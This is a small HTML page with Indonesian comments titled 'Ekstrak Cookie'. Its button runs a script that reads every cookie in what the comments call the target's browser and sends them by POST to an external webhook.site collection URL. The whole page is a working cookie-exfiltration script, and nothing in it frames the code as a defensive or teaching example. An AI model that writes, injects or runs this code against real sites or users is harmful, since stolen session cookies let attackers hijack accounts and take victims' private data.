<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ekstrak Cookie</title>
</head>
<body>
    <button onclick="ekstrakCookie()">Ekstrak Cookie</button>

    <script>
        function ekstrakCookie() {
            // Mengambil semua cookie yang ada di browser target
            var semuaCookie = document.cookie;

            // Kirim cookie ke server atau lakukan apapun yang diinginkan
            // Contoh: Mengirim cookie ke endpoint server menggunakan fetch API
            fetch('https://webhook.site/535797ef-1f9c-452a-94ab-633b408224ea', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ cookies: semuaCookie })
            })
            .then(response => {
                // Lakukan sesuatu setelah permintaan selesai, jika perlu
                console.log('Cookie telah berhasil diekstrak dan dikirim.');
            })
            .catch(error => {
                // Tangani kesalahan jika terjadi
                console.error('Terjadi kesalahan:', error);
            });
        }
    </script>
</body>
</html>
